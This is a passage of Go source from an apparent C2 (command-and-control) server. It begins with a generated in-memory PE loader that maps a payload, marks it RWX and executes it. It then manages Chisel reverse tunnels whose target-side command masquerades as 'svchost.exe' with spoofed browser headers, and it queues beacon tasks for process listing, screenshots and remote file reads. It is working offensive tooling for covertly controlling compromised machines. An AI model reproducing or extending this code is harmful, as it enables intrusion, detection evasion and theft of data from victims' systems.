	pFlushICache    = kernel32.NewProc("FlushInstructionCache")
	pGetCurrentProc = kernel32.NewProc("GetCurrentProcess")
	pRtlMoveMemory  = ntdll.NewProc("RtlMoveMemory")
)

func r16(b []byte, o uint32) uint16 { return binary.LittleEndian.Uint16(b[o:]) }
func r32(b []byte, o uint32) uint32 { return binary.LittleEndian.Uint32(b[o:]) }
func r64(b []byte, o uint32) uint64 { return binary.LittleEndian.Uint64(b[o:]) }

func main() {
	pe := []byte{
		%s,
	}

	lfanew    := r32(pe, 0x3C)
	numSec    := r16(pe, lfanew+0x06)
	optSz     := r16(pe, lfanew+0x14)
	entryRVA  := r32(pe, lfanew+0x28)
	imgBase   := r64(pe, lfanew+0x30)
	sizeOfImg := r32(pe, lfanew+0x50)
	sizeOfHdr := r32(pe, lfanew+0x54)

	/* Allocate at preferred base, fallback to any */
	base, _, _ := pVirtualAlloc.Call(
		uintptr(imgBase), uintptr(sizeOfImg), MEM_COMMIT_RESERVE, PAGE_READWRITE)
	if base == 0 {
		base, _, _ = pVirtualAlloc.Call(0, uintptr(sizeOfImg), MEM_COMMIT_RESERVE, PAGE_READWRITE)
	}
	if base == 0 { return }

	/* Copy headers */
	pRtlMoveMemory.Call(base, uintptr(unsafe.Pointer(&pe[0])), uintptr(sizeOfHdr))

	/* Map sections */
	secOff := lfanew + 0x18 + uint32(optSz)
	for i := uint16(0); i < numSec; i++ {
		s := secOff + uint32(i)*40
		va     := r32(pe, s+12)
		rawSz  := r32(pe, s+16)
		rawPtr := r32(pe, s+20)
		if rawSz > 0 && rawPtr > 0 {
			pRtlMoveMemory.Call(
				base+uintptr(va),
				uintptr(unsafe.Pointer(&pe[rawPtr])),
				uintptr(rawSz))
		}
	}

	/* Relocations */
	delta := int64(base) - int64(imgBase)
	if delta != 0 {
		relocRVA  := r32(pe, lfanew+0xB0)
		relocSize := r32(pe, lfanew+0xB4)
		if relocSize > 0 && relocRVA > 0 {
			off := uint32(0)
			for off < relocSize {
				blkRVA  := *(*uint32)(unsafe.Pointer(base + uintptr(relocRVA+off)))
				blkSize := *(*uint32)(unsafe.Pointer(base + uintptr(relocRVA+off+4)))
				if blkSize == 0 { break }
				cnt := (blkSize - 8) / 2
				for j := uint32(0); j < cnt; j++ {
					entry := *(*uint16)(unsafe.Pointer(base + uintptr(relocRVA+off+8+j*2)))
					tp  := entry >> 12
					eo  := entry & 0xFFF
					patch := base + uintptr(blkRVA) + uintptr(eo)
					if tp == 10 { /* DIR64 */
						*(*int64)(unsafe.Pointer(patch)) += delta
					} else if tp == 3 { /* HIGHLOW */
						*(*int32)(unsafe.Pointer(patch)) += int32(delta)
					}
				}
				off += blkSize
			}
		}
	}

	/* Resolve imports */
	impRVA  := r32(pe, lfanew+0x90)
	impSize := r32(pe, lfanew+0x94)
	if impSize > 0 && impRVA > 0 {
		io := uint32(0)
		for {
			ib := base + uintptr(impRVA+io)
			origFT := *(*uint32)(unsafe.Pointer(ib))
			nameRV := *(*uint32)(unsafe.Pointer(ib + 12))
			firstT := *(*uint32)(unsafe.Pointer(ib + 16))
			if nameRV == 0 { break }

			hDll, _, _ := pLoadLibrary.Call(base + uintptr(nameRV))
			if hDll == 0 { io += 20; continue }

			tRVA := origFT
			if tRVA == 0 { tRVA = firstT }
			idx := uint32(0)
			for {
				tv := *(*uint64)(unsafe.Pointer(base + uintptr(tRVA) + uintptr(idx*8)))
				if tv == 0 { break }
				var fn uintptr
				if tv&0x8000000000000000 != 0 {
					fn, _, _ = pGetProcAddr.Call(hDll, uintptr(tv&0xFFFF))
				} else {
					fn, _, _ = pGetProcAddr.Call(hDll, base+uintptr(tv)+2)
				}
				*(*uintptr)(unsafe.Pointer(base + uintptr(firstT) + uintptr(idx*8))) = fn
				idx++
			}
			io += 20
		}
	}

	/* Set RWX + flush */
	var oldProt uint32
	pVirtualProtect.Call(base, uintptr(sizeOfImg), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
	proc, _, _ := pGetCurrentProc.Call()
	pFlushICache.Call(proc, base, uintptr(sizeOfImg))

	/* Execute entry point */
	thread, _, _ := pCreateThread.Call(0, 0, base+uintptr(entryRVA), 0, 0, 0)
	pWaitForSingle.Call(thread, INFINITE)
}
`, len(peBytes), formatted)
}

func handleGetProxies(c *gin.Context) {
	var proxyList []Proxy
	db.Order("created_at desc").Find(&proxyList)

	// Check which ones are actually alive
	chiselProcsMu.Lock()
	for i := range proxyList {
		if cmd, ok := chiselProcs[proxyList[i].ID]; ok {
			if cmd.Process != nil && cmd.ProcessState == nil {
				proxyList[i].Status = "running"
			} else {
				proxyList[i].Status = "dead"
			}
		}
	}
	chiselProcsMu.Unlock()

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: proxyList})
}

func handleCreateProxy(c *gin.Context) {
	var req struct {
		Type       string `json:"type" binding:"required"` // chisel_reverse_socks, chisel_reverse_port, chisel_forward
		ListenPort int    `json:"listen_port" binding:"required"`
		RemoteStr  string `json:"remote_str"` // e.g. "R:socks" or "R:8080:10.0.0.1:80"
		ClientID   string `json:"client_id"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	chiselBin := findChiselBinary()
	if chiselBin == "" {
		c.JSON(http.StatusBadRequest, APIResponse{
			Status:  "error",
			Message: "CHISEL_NOT_FOUND: Place chisel binary in ./tools/ directory",
		})
		return
	}

	wsPath := randomWsPath()
	authKey := randomAuthKey()

	// Build remote spec
	remoteSpec := req.RemoteStr
	if remoteSpec == "" {
		switch req.Type {
		case "chisel_reverse_socks":
			remoteSpec = fmt.Sprintf("R:0.0.0.0:%d:socks", req.ListenPort)
		case "chisel_reverse_port":
			remoteSpec = fmt.Sprintf("R:0.0.0.0:%d", req.ListenPort)
		default:
			remoteSpec = fmt.Sprintf("0.0.0.0:%d", req.ListenPort)
		}
	}

	newID := "PX-" + uuid.New().String()[:8]

	// Start chisel server
	serverPort := req.ListenPort + 10000
	if serverPort > 65535 {
		serverPort = 50000 + (req.ListenPort % 10000)
	}

	// Anti-fingerprint: custom headers to mask chisel traffic
	args := []string{
		"server",
		"--port", strconv.Itoa(serverPort),
		"--auth", authKey,
		"--reverse",
		"--backend", wsPath,
	}

	cmd := exec.Command(chiselBin, args...)
	// No SysProcAttr needed - chisel server runs on C2 host

	if err := cmd.Start(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{
			Status: "error", Message: "CHISEL_START_FAILED: " + err.Error(),
		})
		return
	}

	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	// Monitor process in background
	go func() {
		cmd.Wait()
		chiselProcsMu.Lock()
		delete(chiselProcs, newID)
		chiselProcsMu.Unlock()
		db.Model(&Proxy{}).Where("id = ?", newID).Update("status", "dead")
		addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_EXITED: %s (PID %d)", newID, pid))
	}()

	chiselProcsMu.Lock()
	chiselProcs[newID] = cmd
	chiselProcsMu.Unlock()

	serverURL := fmt.Sprintf("http://C2_HOST:%d", serverPort)

	p := &Proxy{
		ID:         newID,
		ClientID:   req.ClientID,
		Type:       req.Type,
		Mode:       "server",
		ListenPort: serverPort,
		RemoteStr:  remoteSpec,
		ServerURL:  serverURL,
		AuthKey:    authKey,
		WsPath:     wsPath,
		Status:     "running",
		PID:        pid,
		CreatedAt:  time.Now(),
	}

	if err := db.Create(p).Error; err != nil {
		cmd.Process.Kill()
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Build client command for deployment on target
	clientCmd := buildChiselClientCmd(req.Type, serverPort, authKey, wsPath, remoteSpec)

	addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_STARTED: %s port=%d ws=%s PID=%d", newID, serverPort, wsPath, pid))

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"proxy":      p,
			"client_cmd": clientCmd,
			"deploy_tip": "Replace C2_HOST with your actual C2 IP/domain",
		},
	})
}

// buildChiselClientCmd generates the client command for target deployment
func buildChiselClientCmd(tunnelType string, serverPort int, authKey, wsPath, remoteSpec string) string {
	// Use innocent binary name
	binName := "svchost.exe"

	base := fmt.Sprintf(
		`%s client --auth "%s" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --header "Accept: text/html,*/*" http://C2_HOST:%d%s`,
		binName, authKey, serverPort, wsPath,
	)

	switch tunnelType {
	case "chisel_reverse_socks":
		return base + " R:socks"
	case "chisel_reverse_port":
		return base + " " + remoteSpec
	default:
		return base + " " + remoteSpec
	}
}

func handleDeleteProxy(c *gin.Context) {
	id := c.Param("id")

	// Kill chisel process if running
	chiselProcsMu.Lock()
	if cmd, ok := chiselProcs[id]; ok {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		delete(chiselProcs, id)
	}
	chiselProcsMu.Unlock()

	result := db.Delete(&Proxy{}, "id = ?", id)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
		return
	}

	if result.RowsAffected > 0 {
		addLog("PROXY", "CHISEL_TUNNEL_TERMINATED: "+id)
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROXY_DELETED"})
		return
	}
	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
}

// --- Process / Screenshot ---

func handleGetProcesses(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	// Queue a process listing task
	taskID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        taskID,
		ClientID:  clientID,
		Command:   "tasklist /v /fo csv",
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(task)

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROCESS_LIST_QUEUED", Data: map[string]string{"task_id": taskID}})
}

func handleGetScreenshot(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	taskID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        taskID,
		ClientID:  clientID,
		Command:   "__SCREENSHOT__",
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(task)

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SCREENSHOT_QUEUED", Data: map[string]string{"task_id": taskID}})
}

// --- Middleware ---

func AuthRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		session := sessions.Default(c)
		auth := session.Get("authenticated")
		if auth != true {
			if c.GetHeader("X-Requested-With") == "XMLHttpRequest" || strings.HasPrefix(c.FullPath(), "/api/") {
				c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "UNAUTHORIZED"})
				c.Abort()
				return
			}
			c.Redirect(http.StatusSeeOther, "/")
			c.Abort()
			return
		}
		// Refresh session (sliding expiration) and apply new MaxAge if changed
		session.Save()
		c.Next()
	}
}

// --- Auth Handlers ---

func handleLogin(c *gin.Context) {
	username := c.PostForm("username")
	password := c.PostForm("password")

	var user User
	if err := db.Where("username = ? AND password = ?", username, password).First(&user).Error; err == nil {
		session := sessions.Default(c)
		session.Set("authenticated", true)
		session.Set("user", user.Username)
		session.Save()

		addLog("SEC", fmt.Sprintf("LOGIN_SUCCESS: %s from %s", username, c.ClientIP()))
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "AUTHENTICATED"})
	} else {
		addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
		c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
	}
}

func handleLogout(c *gin.Context) {
	session := sessions.Default(c)
	session.Clear()
	session.Save()
	c.Redirect(http.StatusSeeOther, "/")
}

func handleGetUserInfo(c *gin.Context) {
	session := sessions.Default(c)
	user := session.Get("user")
	if user == nil {
		user = "Operator"
	}

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"username": user,
		},
	})
}

func handleGetClients(c *gin.Context) {
	var clientList []Client
	group := c.Query("group")
	status := c.Query("status")

	query := db.Order("last_check desc")
	if group != "" {
		query = query.Where("\"group\" = ?", group)
	}
	if status != "" {
		query = query.Where("status = ?", status)
	}
	query.Find(&clientList)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: clientList})
}

func handleGetListeners(c *gin.Context) {
	var list []Listener
	db.Find(&list)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: list})
}

func handleWS(c *gin.Context) {
	// Get username from session at connection time
	session := sessions.Default(c)
	user := session.Get("user")
	wsUsername := "Operator"
	if user != nil {
		wsUsername = user.(string)
	}

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("WS upgrade error:", err)
		return
	}

	wsMutex.Lock()
	wsClients[conn] = true
	for _, l := range logs {
		conn.WriteMessage(websocket.TextMessage, []byte(l))
	}
	wsMutex.Unlock()

	defer func() {
		wsMutex.Lock()
		delete(wsClients, conn)
		wsMutex.Unlock()
		conn.Close()
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var wsMsg struct {
			Type     string `json:"type"`
			Content  string `json:"content"`
			TargetID string `json:"target_id,omitempty"`
		}

		if err := json.Unmarshal(msg, &wsMsg); err == nil {
			if wsMsg.Type == "chat" {
				addLog("CHAT", fmt.Sprintf("[%s] %s", wsUsername, wsMsg.Content))
			} else if wsMsg.Type == "command" && wsMsg.TargetID != "" {
				processCommand(wsMsg.TargetID, wsMsg.Content)
			}
		}
	}
}

// ============================================================
// File Manager Handlers - Chunked Upload / Range Download
// ============================================================

// safePath resolves a user-supplied relative path against fmRoot,
// preventing path traversal attacks.
func safePath(relPath string) (string, error) {
	if relPath == "" {
		relPath = "/"
	}
	// Clean the path
	cleaned := filepath.Clean(relPath)
	// Reject absolute paths or traversal
	if filepath.IsAbs(cleaned) {
		// Strip leading slash/backslash for joining
		cleaned = strings.TrimLeft(cleaned, "/\\")
	}
	joined := filepath.Join(fmRoot, cleaned)
	abs, err := filepath.Abs(joined)
	if err != nil {
		return "", fmt.Errorf("INVALID_PATH")
	}
	root, err := filepath.Abs(fmRoot)
	if err != nil {
		return "", fmt.Errorf("SERVER_ERROR")
	}
	// Ensure resolved path is within root
	if !strings.HasPrefix(abs, root) {
		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
	}
	return abs, nil
}

// handleFMList lists directory contents
func handleFMList(c *gin.Context) {
	relPath := c.Query("path")
	if relPath == "" {
		relPath = "/"
	}

	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Ensure root exists
	root, _ := filepath.Abs(fmRoot)
	os.MkdirAll(root, 0755)

	info, err := os.Stat(absPath)
	if err != nil {
		if os.IsNotExist(err) {
			// If path doesn't exist and it's root, create it
			if absPath == root {
				os.MkdirAll(absPath, 0755)
			} else {
				c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "PATH_NOT_FOUND"})
				return
			}
		} else {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		info, _ = os.Stat(absPath)
	}

	if !info.IsDir() {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "NOT_A_DIRECTORY"})
		return
	}

	entries, err := os.ReadDir(absPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	type FileItem struct {
		Name    string    `json:"name"`
		Path    string    `json:"path"`
		IsDir   bool      `json:"is_dir"`
		Size    int64     `json:"size"`
		ModTime time.Time `json:"mod_time"`
	}

	items := make([]FileItem, 0, len(entries))
	for _, e := range entries {
		fi, err := e.Info()
		if err != nil {
			continue
		}
		// Compute relative path from root
		entryAbs := filepath.Join(absPath, e.Name())
		entryRel, _ := filepath.Rel(root, entryAbs)
		entryRel = "/" + strings.ReplaceAll(entryRel, "\\", "/")

		items = append(items, FileItem{
			Name:    e.Name(),
			Path:    entryRel,
			IsDir:   e.IsDir(),
			Size:    fi.Size(),
			ModTime: fi.ModTime(),
		})
	}

	// Current path relative to root
	currentRel, _ := filepath.Rel(root, absPath)
	currentRel = "/" + strings.ReplaceAll(currentRel, "\\", "/")
	if currentRel == "/." {
		currentRel = "/"
	}

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"path":  currentRel,
			"items": items,
		},
	})
}

// handleFMMkdir creates a directory
func handleFMMkdir(c *gin.Context) {
	var req struct {
		Path string `json:"path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	absPath, err := safePath(req.Path)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	if err := os.MkdirAll(absPath, 0755); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", "DIRECTORY_CREATED: "+req.Path)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DIRECTORY_CREATED"})
}

// handleFMRename renames a file or directory
func handleFMRename(c *gin.Context) {
	var req struct {
		OldPath string `json:"old_path" binding:"required"`
		NewName string `json:"new_name" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	oldAbs, err := safePath(req.OldPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// New path = same parent + new name
	newAbs := filepath.Join(filepath.Dir(oldAbs), filepath.Base(req.NewName))
	root, _ := filepath.Abs(fmRoot)
	if !strings.HasPrefix(newAbs, root) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
		return
	}

	if err := os.Rename(oldAbs, newAbs); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", fmt.Sprintf("RENAMED: %s -> %s", req.OldPath, req.NewName))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "RENAMED"})
}

// handleFMDelete deletes a file or directory
func handleFMDelete(c *gin.Context) {
	var req struct {
		Path string `json:"path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	absPath, err := safePath(req.Path)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Don't allow deleting root
	root, _ := filepath.Abs(fmRoot)
	if absPath == root {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CANNOT_DELETE_ROOT"})
		return
	}

	if err := os.RemoveAll(absPath); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", "DELETED: "+req.Path)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED"})
}

// handleFMInfo returns file info (size, etc.) before download
func handleFMInfo(c *gin.Context) {
	relPath := c.Query("path")
	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	fi, err := os.Stat(absPath)
	if err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "FILE_NOT_FOUND"})
		return
	}

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"name":     fi.Name(),
			"size":     fi.Size(),
			"is_dir":   fi.IsDir(),
			"mod_time": fi.ModTime(),
		},
	})
}

// --- Chunked Upload ---

// handleFMUploadInit initializes a chunked upload session
func handleFMUploadInit(c *gin.Context) {
	var req struct {
		FileName    string `json:"file_name" binding:"required"`
		DestPath    string `json:"dest_path"` // directory to upload into
		TotalSize   int64  `json:"total_size" binding:"required"`
		TotalChunks int    `json:"total_chunks" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	if req.DestPath == "" {
		req.DestPath = "/"
	}

	// Validate destination
	destAbs, err := safePath(req.DestPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	os.MkdirAll(destAbs, 0755)

	uploadID := "UP-" + uuid.New().String()[:8]

	// Create temp directory for chunks
	tmpDir := filepath.Join(os.TempDir(), "prts_upload_"+uploadID)
	os.MkdirAll(tmpDir, 0755)

	session := &UploadSession{
		ID:          uploadID,
		FileName:    filepath.Base(req.FileName),
		DestPath:    req.DestPath,
		TotalSize:   req.TotalSize,
		TotalChunks: req.TotalChunks,
		Received:    make(map[int]bool),
		TempDir:     tmpDir,
		CreatedAt:   time.Now(),
	}

	uploadSessionsMu.Lock()
	uploadSessions[uploadID] = session
	uploadSessionsMu.Unlock()

	addLog("FILE", fmt.Sprintf("UPLOAD_INIT: %s (%d bytes, %d chunks)", req.FileName, req.TotalSize, req.TotalChunks))

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"upload_id":    uploadID,
			"total_chunks": req.TotalChunks,
		},
	})
}

// handleFMUploadChunk receives a single chunk
func handleFMUploadChunk(c *gin.Context) {
	uploadID := c.Param("upload_id")

	uploadSessionsMu.Lock()
	session, exists := uploadSessions[uploadID]
	uploadSessionsMu.Unlock()

	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "UPLOAD_SESSION_NOT_FOUND"})
		return
	}

	chunkIndexStr := c.PostForm("chunk_index")
	if chunkIndexStr == "" {
		chunkIndexStr = c.Query("chunk_index")
	}
	chunkIndex, err := strconv.Atoi(chunkIndexStr)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_CHUNK_INDEX"})
		return
	}

	file, err := c.FormFile("chunk")
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CHUNK_DATA_MISSING: " + err.Error()})
		return
	}

	chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", chunkIndex))
	if err := c.SaveUploadedFile(file, chunkPath); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CHUNK_SAVE_FAILED: " + err.Error()})
		return
	}

	uploadSessionsMu.Lock()
	session.Received[chunkIndex] = true
	received := len(session.Received)
	uploadSessionsMu.Unlock()

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"chunk_index": chunkIndex,
			"received":    received,
			"total":       session.TotalChunks,
		},
	})
}

// handleFMUploadComplete merges chunks into final file
func handleFMUploadComplete(c *gin.Context) {
	uploadID := c.Param("upload_id")

	uploadSessionsMu.Lock()
	session, exists := uploadSessions[uploadID]
	uploadSessionsMu.Unlock()

	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "UPLOAD_SESSION_NOT_FOUND"})
		return
	}

	// Verify all chunks received
	if len(session.Received) != session.TotalChunks {
		c.JSON(http.StatusBadRequest, APIResponse{
			Status:  "error",
			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", len(session.Received), session.TotalChunks),
		})
		return
	}

	// Resolve final destination
	destAbs, err := safePath(session.DestPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	finalPath := filepath.Join(destAbs, session.FileName)

	// Merge chunks
	outFile, err := os.Create(finalPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CREATE_FAILED: " + err.Error()})
		return
	}
	defer outFile.Close()

	for i := 0; i < session.TotalChunks; i++ {
		chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", i))
		chunkData, err := os.ReadFile(chunkPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("CHUNK_READ_FAILED: chunk %d", i)})
			return
		}
		if _, err := outFile.Write(chunkData); err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED: " + err.Error()})
			return
		}
	}

	// Cleanup temp
	os.RemoveAll(session.TempDir)

	uploadSessionsMu.Lock()
	delete(uploadSessions, uploadID)
	uploadSessionsMu.Unlock()

	fi, _ := os.Stat(finalPath)
	root, _ := filepath.Abs(fmRoot)
	relFinal, _ := filepath.Rel(root, finalPath)
	relFinal = "/" + strings.ReplaceAll(relFinal, "\\", "/")

	addLog("FILE", fmt.Sprintf("UPLOAD_COMPLETE: %s (%d bytes)", session.FileName, fi.Size()))

	c.JSON(http.StatusOK, APIResponse{
		Status:  "success",
		Message: "UPLOAD_COMPLETE",
		Data: map[string]interface{}{
			"name": session.FileName,
			"path": relFinal,
			"size": fi.Size(),
		},
	})
}

// --- Chunked Download (HTTP Range) ---

// handleFMDownload serves a file with Range header support for chunked download
func handleFMDownload(c *gin.Context) {
	relPath := c.Query("path")
	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	fi, err := os.Stat(absPath)
	if err != nil || fi.IsDir() {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "FILE_NOT_FOUND"})
		return
	}

	// Use http.ServeFile which handles Range headers automatically
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fi.Name()))
	c.Header("Accept-Ranges", "bytes")
	http.ServeFile(c.Writer, c.Request, absPath)
}

// ==================== REMOTE FILE MANAGER (Beacon) ====================

// sendTaskAndWait creates a task for a beacon and polls the DB until the task completes or times out.
// The timeout is automatically calculated based on the beacon's sleep interval + extra buffer.
// The minExtra parameter adds extra time on top of the beacon-based timeout (e.g. for large file transfers).
func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, error) {
	// Verify client exists and is online
	var client Client
	if err := db.First(&client, "id = ?", clientID).Error; err != nil {
		return "", fmt.Errorf("client not found: %s", clientID)
	}
	if client.Status != "online" {
		return "", fmt.Errorf("client offline: %s", clientID)
	}

	// Calculate timeout: 2x beacon sleep (to guarantee at least one check-in) + jitter + extra buffer
	beaconSleep := client.Sleep
	if beaconSleep <= 0 {
		beaconSleep = 60 // default assumption
	}
	jitterPct := client.Jitter
	if jitterPct < 0 {
		jitterPct = 20
	}
	// Worst case: sleep + jitter, times 2 for safety, plus extra for processing
	maxWait := float64(beaconSleep) * (1.0 + float64(jitterPct)/100.0) * 2.0
	timeout := time.Duration(maxWait)*time.Second + minExtra
	if timeout < 15*time.Second {
		timeout = 15 * time.Second
	}

	taskID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        taskID,
		ClientID:  clientID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	if err := db.Create(task).Error; err != nil {
		return "", fmt.Errorf("failed to create task: %v", err)
	}

	go addLog("TASK", fmt.Sprintf("RFM_TASK: %s -> %s (%s) timeout=%v", command, clientID, taskID, timeout))

	// Poll for result
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		time.Sleep(500 * time.Millisecond)
		var t Task
		if err := db.First(&t, "id = ?", taskID).Error; err != nil {
			continue
		}
		if t.Status == "completed" {
			return t.Result, nil
		}
		if t.Status == "failed" {
			return "", fmt.Errorf("task failed: %s", t.Result)
		}
	}

	// Timeout - mark task as failed
	db.Model(&Task{}).Where("id = ?", taskID).Updates(map[string]interface{}{
		"status": "failed",
		"result": "TIMEOUT",
	})
	return "", fmt.Errorf("task timeout after %v (beacon sleep=%ds jitter=%d%%)", timeout, beaconSleep, jitterPct)
}

// handleRemoteFMList lists files on a remote beacon
func handleRemoteFMList(c *gin.Context) {
	clientID := c.Query("client_id")
	path := c.Query("path")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id required"})
		return
	}
	if path == "" {
		path = "."
	}

	result, err := sendTaskAndWait(clientID, "__FILELIST__ "+path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Parse the JSON result from the beacon
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: data})
}

// handleRemoteFMDownload downloads a file from a remote beacon
func handleRemoteFMDownload(c *gin.Context) {
	clientID := c.Query("client_id")
	path := c.Query("path")
	if clientID == "" || path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	result, err := sendTaskAndWait(clientID, "__FILEREAD__ "+path, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
